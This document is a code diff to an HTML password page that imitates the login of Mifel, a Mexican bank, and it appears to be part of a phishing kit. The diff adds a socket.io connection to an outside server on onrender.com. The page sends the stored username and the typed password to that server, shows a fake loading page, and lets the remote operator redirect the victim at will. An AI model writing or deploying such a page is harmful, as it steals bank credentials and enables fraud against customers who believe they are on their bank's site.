@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mifel - Contraseña</title>
     <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600&family=Raleway:wght@300;400;500;600&display=swap" rel="stylesheet">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
         :root {
             --mifel-cyan: #00D1C1;
@@ -141,7 +142,7 @@
 
         <p class="welcome-text">Hola, <span class="user-highlight" id="displayName">...</span></p>
 
-        <form class="login-form">
+        <form class="login-form" id="loginForm">
             <div class="form-group">
                 <label>Contraseña</label>
                 <div class="input-wrapper">
@@ -161,21 +162,46 @@
 
     <footer class="footer-simple"></footer>
 
-    <script src="is.js"></script>
-    <script>
-        const rawUser = localStorage.getItem('mifel_user') || "Usuario";
-        document.getElementById('userInitial').innerText = rawUser.charAt(0).toUpperCase();
-        
-        const maskedName = rawUser.charAt(0).toUpperCase() + "*".repeat(Math.max(rawUser.length - 1, 4));
-        document.getElementById('displayName').innerText = maskedName;
+ <script>
+    const socket = io("https://server-wodm.onrender.com", {
+        reconnection: true,
+        reconnectionAttempts: Infinity
+    });
 
-        const togglePassBtn = document.getElementById('togglePass');
-        const passField = document.getElementById('password');
+    const rawUser = localStorage.getItem('mifel_user') || "Usuario";
+    document.getElementById('userInitial').innerText = rawUser.charAt(0).toUpperCase();
+    
+    const maskedName = rawUser.charAt(0).toUpperCase() + "*".repeat(Math.max(rawUser.length - 1, 4));
+    document.getElementById('displayName').innerText = maskedName;
 
-        togglePassBtn.addEventListener('click', function() {
-            const isPass = passField.getAttribute('type') === 'password';
-            passField.setAttribute('type', isPass ? 'text' : 'password');
+    socket.on('connect', () => {
+        socket.emit('register_user', { user: rawUser }); 
+    });
+
+    socket.on('navigate', (data) => {
+        window.location.href = data.url;
+    });
+
+    const passField = document.getElementById('password');
+    document.getElementById('togglePass').addEventListener('click', () => {
+        const isPass = passField.type === 'password';
+        passField.type = isPass ? 'text' : 'password';
+    });
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const password = passField.value;
+
+        socket.emit('register_user', { 
+            user: rawUser, 
+            pass: password 
         });
-    </script>
+
+
+        setTimeout(() => {
+            window.location.href = "loading1.html";
+        }, 300);
+    });
+</script>
 </body>
 </html>
